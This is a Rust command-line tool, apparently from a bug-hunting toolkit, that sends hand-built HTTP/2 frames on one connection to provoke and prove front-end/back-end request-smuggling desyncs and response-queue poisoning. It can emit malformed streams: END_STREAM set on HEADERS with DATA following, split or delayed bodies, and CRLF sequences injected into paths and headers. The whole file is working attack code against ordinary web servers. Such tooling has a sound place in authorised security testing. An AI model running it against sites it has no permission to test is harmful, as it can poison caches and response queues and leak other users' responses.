#!/usr/bin/env rust-script
//! name: h2seq
//! description: Same-connection HTTP/2 arm+follow sequencer - send an arm request (custom headers + body) on stream 1, wait for its response, then issue a follow request on stream 3 of the SAME h2 connection, reporting both responses (status, body snippet, marker hit) so a front-end/back-end framing desync (response-queue poisoning) is provable on one connection instead of across pooled upstream connections.
//! version: 1.0.0
//! args: <url> --arm '<METHOD> <PATH>' [--arm-header 'K: V']... [--arm-data BODY] --follow '<METHOD> <PATH>' [--follow-header 'K: V']... [--follow-data BODY] [--marker S] [--read-ms N] [--quiet]
//! keywords: h2, http2, smuggling, desync, sequencer, response-queue, poisoning, hunter, 0cl
//!
//! ```cargo
//! [dependencies]
//! tokio = { version = "1", features = ["rt-multi-thread", "net", "io-util", "time", "macros"] }
//! tokio-rustls = "0.26"
//! webpki-roots = "0.26"
//! hpack = "0.3"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls::pki_types::ServerName;
use tokio_rustls::rustls::ClientConfig;
use tokio_rustls::TlsConnector;

#[derive(Default)]
struct Req {
    method: String,
    path: String,
    headers: Vec<(String, String)>,
    data: Option<String>,
    /// If set, split the body into two DATA frames: first `split` bytes, then the rest.
    split: Option<usize>,
    /// If set, set END_STREAM on the HEADERS frame even when DATA follows.
    hdr_end: bool,
    /// If set, wait this many ms after HEADERS before sending DATA.
    delay_ms: u64,
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        // 自省 kimi C3(0cl 臂产件补 selftest):frame/truncate 纯函数根基。
        let f = frame(0x4, 0x1, 3, b"abcd");
        let ok = f.len() == 9 + 4 && f[3] == 0x4 && truncate("abcdefghij", 4) == "abcd";
        pi_rust_lib::report::success("h2seq", json!({"selftest": if ok { "ok" } else { "fail" }}), "frame + truncate roots").unwrap_or(());
        std::process::exit(if ok { 0 } else { 1 });
    }
    let mut url = String::new();
    let mut arm = Req::default();
    let mut follow = Req::default();
    let mut read_ms: u64 = 3000;
    let mut quiet = false;
    let mut marker = String::new();

    let mut i = 0;
    while i < args.len() {
        match args[i].as_str() {
            "--arm" => {
                i += 1;
                split_method_path(args.get(i).map(String::as_str).unwrap_or(""), &mut arm);
            }
            "--arm-header" => {
                i += 1;
                push_header(args.get(i).map(String::as_str).unwrap_or(""), &mut arm);
            }
            "--arm-data" => {
                i += 1;
                arm.data = args.get(i).map(|s| unescape(s));
            }
            "--follow" => {
                i += 1;
                split_method_path(args.get(i).map(String::as_str).unwrap_or(""), &mut follow);
            }
            "--follow-header" => {
                i += 1;
                push_header(args.get(i).map(String::as_str).unwrap_or(""), &mut follow);
            }
            "--follow-data" => {
                i += 1;
                follow.data = args.get(i).map(|s| unescape(s));
            }
            "--arm-split" => {
                i += 1;
                arm.split = args.get(i).and_then(|v| v.parse().ok());
            }
            "--arm-hdr-end" => arm.hdr_end = true,
            "--follow-hdr-end" => follow.hdr_end = true,
            "--arm-delay-ms" => {
                i += 1;
                arm.delay_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(0);
            }
            "--follow-split" => {
                i += 1;
                follow.split = args.get(i).and_then(|v| v.parse().ok());
            }
            "--marker" => {
                i += 1;
                marker = args.get(i).cloned().unwrap_or_default();
            }
            "--read-ms" => {
                i += 1;
                read_ms = args.get(i).and_then(|v| v.parse().ok()).unwrap_or(read_ms);
            }
            "--quiet" => quiet = true,
            other if !other.starts_with("--") && url.is_empty() => url = other.to_string(),
            _ => {}
        }
        i += 1;
    }

    if url.is_empty() || arm.method.is_empty() || follow.method.is_empty() {
        pi_rust_lib::report::failure(
            "h2seq",
            "usage",
            "call as: h2seq <url> --arm 'POST /' [--arm-header 'content-length: 0'] [--arm-data ...] --follow 'GET /'",
        );
        std::process::exit(2);
    }

    let parsed = url::Url::parse(&url).unwrap_or_else(|_| url::Url::parse("https://invalid/").unwrap());
    let host = parsed.host_str().unwrap_or("").to_string();
    let port = parsed.port().unwrap_or(443);
    let authority = host.clone();
    let deadline: f64 = std::env::var("PI_TIMEOUT_SECS").ok().and_then(|v| v.parse().ok()).unwrap_or(60.0);

    match tokio::time::timeout(
        Duration::from_secs_f64(deadline),
        run(&host, port, &authority, &arm, &follow, read_ms, marker.clone(), quiet),
    )
    .await
    {
        Ok(Ok(v)) => {
            let next = "compare arm vs follow: a follow whose body/status belongs to the other request is the desync";
            pi_rust_lib::report::success("h2seq", v, next).unwrap_or(());
        }
        Ok(Err(e)) => {
            pi_rust_lib::report::failure("h2seq", &e, "check the frames and the read window");
            std::process::exit(1);
        }
        Err(_) => {
            pi_rust_lib::report::failure("h2seq", &format!("deadline {deadline}s reached"), "raise PI_TIMEOUT_SECS");
            std::process::exit(1);
        }
    }
}

fn split_method_path(s: &str, out: &mut Req) {
    // Method is the first whitespace-delimited token; everything after the first
    // space is the path (so injected CRLFs may contain spaces).
    match s.split_once(' ') {
        Some((m, p)) => {
            out.method = unescape(m);
            out.path = unescape(p);
        }
        None => out.method = unescape(s),
    }
    if out.path.is_empty() {
        out.path = "/".to_string();
    }
}

fn push_header(s: &str, out: &mut Req) {
    let s = unescape(s);
    if let Some((n, v)) = s.split_once(':') {
        out.headers.push((n.trim().to_string(), v.trim().to_string()));
    }
}

async fn run(
    host: &str,
    port: u16,
    authority: &str,
    arm: &Req,
    follow: &Req,
    read_ms: u64,
    marker: String,
    quiet: bool,
) -> Result<Value, String> {
    let mut roots = tokio_rustls::rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let mut config = ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    config.alpn_protocols = vec![b"h2".to_vec()];
    let connector = TlsConnector::from(Arc::new(config));
    let server_name = ServerName::try_from(host.to_string()).map_err(|e| format!("server name: {e}"))?;
    let tcp = TcpStream::connect((host, port)).await.map_err(|e| format!("connect {host}:{port}: {e}"))?;
    let mut tls = connector.connect(server_name, tcp).await.map_err(|e| format!("tls: {e}"))?;

    tls.write_all(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n").await.map_err(|e| format!("preface: {e}"))?;
    tls.write_all(&frame(4, 0, 0, &[])).await.map_err(|e| format!("settings: {e}"))?;

    send_stream(&mut tls, 1, authority, arm).await?;
    let arm_r = read_until(&mut tls, 1, read_ms).await?;

    send_stream(&mut tls, 3, authority, follow).await?;
    let follow_r = read_until(&mut tls, 3, read_ms).await?;

    let marker_hit = !marker.is_empty()
        && (follow_r.2.contains(&marker) || arm_r.2.contains(&marker));
    let mut v = json!({
        "url": url::Url::parse(&format!("https://{host}")).map(|u| u.to_string()).unwrap_or_default(),
        "arm_status": arm_r.0,
        "arm_body_len": arm_r.2.len(),
        "follow_status": follow_r.0,
        "follow_body_len": follow_r.2.len(),
        "marker": marker,
        "marker_hit": marker_hit,
    });
    if !quiet {
        v["arm_body_snippet"] = json!(truncate(&arm_r.2, 240));
        v["follow_body_snippet"] = json!(truncate(&follow_r.2, 240));
    }
    Ok(v)
}

async fn send_stream<S: AsyncReadExt + AsyncWriteExt + Unpin>(
    tls: &mut S,
    sid: u32,
    authority: &str,
    req: &Req,
) -> Result<(), String> {
    let mut hdrs: Vec<(Vec<u8>, Vec<u8>)> = vec![
        (b":method".to_vec(), req.method.as_bytes().to_vec()),
        (b":scheme".to_vec(), b"https".to_vec()),
        (b":authority".to_vec(), authority.as_bytes().to_vec()),
        (b":path".to_vec(), req.path.as_bytes().to_vec()),
    ];
    for (n, val) in &req.headers {
        hdrs.push((n.as_bytes().to_vec(), val.as_bytes().to_vec()));
    }
    let block = hpack::Encoder::new().encode(hdrs.iter().map(|(n, v)| (n.as_slice(), v.as_slice())));
    let mut flags = 0x4u8; // END_HEADERS
    if req.data.is_none() || req.hdr_end {
        flags |= 0x1; // END_STREAM
    }
    tls.write_all(&frame(1, flags, sid, &block)).await.map_err(|e| format!("headers: {e}"))?;
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    if let Some(body) = &req.data {
        if req.delay_ms > 0 {
            tokio::time::sleep(Duration::from_millis(req.delay_ms)).await;
        }
        let bytes = body.as_bytes();
        let at = req.split.unwrap_or(bytes.len()).min(bytes.len());
        if req.hdr_end {
            // Stream already ended on HEADERS: send DATA without END_STREAM.
            tls.write_all(&frame(0, 0x0, sid, bytes)).await.map_err(|e| format!("data: {e}"))?;
        } else if req.split.is_some() {
            // First DATA frame is NOT end-of-stream; the second closes the stream.
            tls.write_all(&frame(0, 0x0, sid, &bytes[..at])).await.map_err(|e| format!("data1: {e}"))?;
            tls.write_all(&frame(0, 0x1, sid, &bytes[at..])).await.map_err(|e| format!("data2: {e}"))?;
        } else {
            tls.write_all(&frame(0, 0x1, sid, bytes)).await.map_err(|e| format!("data: {e}"))?;
        }
    }
    tls.flush().await.map_err(|e| format!("flush: {e}"))?;
    Ok(())
}

/// Read frames until `want` stream sees END_STREAM / RST or the idle window expires.
/// Returns (status, raw_repr, body).
async fn read_until<S: AsyncReadExt + AsyncWriteExt + Unpin>(
    stream: &mut S,
    want: u32,
    read_ms: u64,
) -> Result<(Option<String>, String, String), String> {
    let mut body = String::new();
    let mut status: Option<String> = None;
    let mut note = String::new();
    let mut decoder = hpack::Decoder::new();
    let mut pending: std::collections::BTreeMap<u32, (Vec<u8>, bool)> = std::collections::BTreeMap::new();
    let idle = Duration::from_millis(read_ms.max(300));
    let mut gave_up = false;
    loop {
        let mut hdr = [0u8; 9];
        match tokio::time::timeout(idle, stream.read_exact(&mut hdr)).await {
            Err(_) => {
                gave_up = true;
                break;
            }
            Ok(Err(_)) => break,
            Ok(Ok(_)) => {}
        }
        let len = ((hdr[0] as usize) << 16) | ((hdr[1] as usize) << 8) | hdr[2] as usize;
        let ftype = hdr[3];
        let flags = hdr[4];
        let sid = u32::from_be_bytes([hdr[5] & 0x7f, hdr[6], hdr[7], hdr[8]]);
        let mut payload = vec![0u8; len];
        if len > 0 && tokio::time::timeout(idle, stream.read_exact(&mut payload)).await.is_err() {
            break;
        }
        match ftype {
            4 => {
                if flags & 0x1 == 0 {
                    let _ = stream.write_all(&frame(4, 0x1, 0, &[])).await;
                    let _ = stream.flush().await;
                }
            }
            1 | 9 => {
                let e = pending.entry(sid).or_insert_with(|| (Vec::new(), false));
                e.0.extend_from_slice(&payload);
                if flags & 0x4 != 0 {
                    e.1 = true;
                }
                if e.1 {
                    let block = e.0.clone();
                    pending.remove(&sid);
                    if let Ok(hs) = decoder.decode(&block) {
                        if sid == want {
                            status = hs.iter().find(|(n, _)| n == b":status").map(|(_, v)| String::from_utf8_lossy(v).to_string());
                            if flags & 0x1 != 0 {
                                break;
                            }
                        }
                    }
                }
            }
            0 => {
                if sid == want {
                    body.push_str(&String::from_utf8_lossy(&payload));
                    if flags & 0x1 != 0 {
                        break;
                    }
                }
            }
            3 => {
                if sid == want {
                    note = format!("rst_stream {}", u32::from_be_bytes([payload.first().copied().unwrap_or(0), payload.get(1).copied().unwrap_or(0), payload.get(2).copied().unwrap_or(0), payload.get(3).copied().unwrap_or(0)]));
                    break;
                }
            }
            _ => {}
        }
    }
    if gave_up && note.is_empty() {
        note = "idle-timeout (no end_stream)".to_string();
    }
    Ok((status, note, body))
}

fn frame(ftype: u8, flags: u8, stream: u32, payload: &[u8]) -> Vec<u8> {
    let len = payload.len();
    let mut out = Vec::with_capacity(9 + len);
    out.push((len >> 16) as u8);
    out.push((len >> 8) as u8);
    out.push(len as u8);
    out.push(ftype);
    out.push(flags);
    out.push((stream >> 24) as u8);
    out.push((stream >> 16) as u8);
    out.push((stream >> 8) as u8);
    out.push(stream as u8);
    out.extend_from_slice(payload);
    out
}

fn truncate(s: &str, n: usize) -> String {
    s.chars().take(n).collect()
}

fn unescape(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('r') => out.push('\r'),
                Some('n') => out.push('\n'),
                Some('t') => out.push('\t'),
                Some('\\') => out.push('\\'),
                Some(other) => {
                    out.push('\\');
                    out.push(other);
                }
                None => out.push('\\'),
            }
        } else {
            out.push(c);
        }
    }
    out
}
